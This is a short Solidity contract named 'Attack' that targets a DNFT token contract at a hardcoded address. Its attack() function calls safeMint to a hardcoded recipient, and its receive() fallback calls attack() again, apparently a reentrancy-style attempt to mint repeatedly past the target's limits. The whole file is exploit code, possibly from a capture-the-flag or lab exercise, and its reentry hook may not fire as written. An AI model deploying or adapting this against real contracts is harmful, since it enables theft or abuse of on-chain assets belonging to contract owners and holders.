// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "contract-3b48812064.sol";

contract Attack{

    DNFT public immutable test;
    constructor(){
        test = DNFT(0xc4C225073D5a6f3ebb395D47bf59b06E6b72158A);
    }
    function getSupply()public view returns(uint256){
        return test.getTotalMinted();
    }
    function attack()external payable{
        test.safeMint(0xD6019043FB023808616C2376e90A6003fb057793, "");
    }
    receive() external payable{
        this.attack();
    }
}